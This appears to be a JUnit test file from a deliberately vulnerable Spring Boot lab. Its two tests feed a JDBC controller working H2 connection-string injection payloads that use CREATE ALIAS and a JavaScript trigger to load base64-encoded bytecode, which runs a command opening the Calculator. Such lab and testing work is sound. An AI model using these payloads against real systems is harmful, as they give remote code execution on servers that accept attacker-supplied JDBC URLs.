package com.reajason.javaweb.vul.springboot2.controller;

import org.junit.jupiter.api.Test;

/**
 * @author ReaJason
 * @since 2025/6/28
 */
class JDBCControllerTest {

    @Test
    void testJDBC() throws Exception {
        JDBCController jdbcController = new JDBCController();
        String b64Bytecode = "yv66vgAAADQAIQoABwAUCgAVABYIABcKABUAGAcAGQcAGgcAGwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA9TGNvbS9yZWFqYXNvbi9qYXZhd2ViL3Z1bC9zcHJpbmdib290Mi9jb250cm9sbGVyL0NvbW1hbmRFeGVjOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGQEAClNvdXJjZUZpbGUBABBDb21tYW5kRXhlYy5qYXZhDAAIAAkHABwMAB0AHgEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAHwAgAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAO2NvbS9yZWFqYXNvbi9qYXZhd2ViL3Z1bC9zcHJpbmdib290Mi9jb250cm9sbGVyL0NvbW1hbmRFeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcAAAAAAAIAAQAIAAkAAQAKAAAALwABAAEAAAAFKrcAAbEAAAACAAsAAAAGAAEAAAAJAAwAAAAMAAEAAAAFAA0ADgAAAAgADwAJAAEACgAAAE8AAgABAAAADrgAAhIDtgAEV6cABEuxAAEAAAAJAAwABQADAAsAAAASAAQAAAAMAAkADwAMAA0ADQAQAAwAAAACAAAAEAAAAAcAAkwHABEAAAEAEgAAAAIAEw==";
        String ss = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
                "String a(String a) throws java.lang.Exception{" +
                "byte[] bytes=null\\;" +
                "String base64Str=\"" + b64Bytecode + "\"\\;" +
                "        try {\n" +
                "            bytes=java.util.Base64.getDecoder().decode(base64Str)\\;" +
                "        } catch (java.lang.Exception var6) {\n" +
                "                bytes = new sun.misc.BASE64Decoder().decodeBuffer(base64Str)\\;\n" +
                "        }" +
                "java.lang.reflect.Method defineClassMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
                "defineClassMethod.setAccessible(true)\\;" +
                "java.lang.Class myclass=(java.lang.Class)defineClassMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytes,0,bytes.length)\\;" +
                "myclass.newInstance()\\;" +
                "return null\\;" +
                "}'\\;" +
                "CALL look('')";
        jdbcController.JDBC(ss);
    }

    @Test
    void testScriptJDBC() throws Exception {
        JDBCController jdbcController = new JDBCController();
        String b64Bytecode = "yv66vgAAADQAIQoABwAUCgAVABYIABcKABUAGAcAGQcAGgcAGwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA9TGNvbS9yZWFqYXNvbi9qYXZhd2ViL3Z1bC9zcHJpbmdib290Mi9jb250cm9sbGVyL0NvbW1hbmRFeGVjOwEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGQEAClNvdXJjZUZpbGUBABBDb21tYW5kRXhlYy5qYXZhDAAIAAkHABwMAB0AHgEAEm9wZW4gLWEgQ2FsY3VsYXRvcgwAHwAgAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAO2NvbS9yZWFqYXNvbi9qYXZhd2ViL3Z1bC9zcHJpbmdib290Mi9jb250cm9sbGVyL0NvbW1hbmRFeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAGAAcAAAAAAAIAAQAIAAkAAQAKAAAALwABAAEAAAAFKrcAAbEAAAACAAsAAAAGAAEAAAAJAAwAAAAMAAEAAAAFAA0ADgAAAAgADwAJAAEACgAAAE8AAgABAAAADrgAAhIDtgAEV6cABEuxAAEAAAAJAAwABQADAAsAAAASAAQAAAAMAAkADwAMAA0ADQAQAAwAAAACAAAAEAAAAAcAAkwHABEAAAEAEgAAAAIAEw==";
        String ss = "jdbc:h2:mem:a;init=CREATE TRIGGER a BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "var base64Str = \"" + b64Bytecode + "\"\\;var bytecode\\;try { bytecode = java.util.Base64.getDecoder().decode(base64Str)\\;} catch (ee) { bytecode = new sun.misc.BASE64Decoder().decodeBuffer(base64Str)\\;}var clsByteArray = (new java.lang.String(\"a\").getBytes().getClass())\\;var clsInt = java.lang.Integer.TYPE\\;var defineClass = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", [clsByteArray, clsInt, clsInt])\\;defineClass.setAccessible(true)\\;var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(), bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length))\\;clazz.newInstance()\\;$$";
        jdbcController.JDBC(ss);
    }
}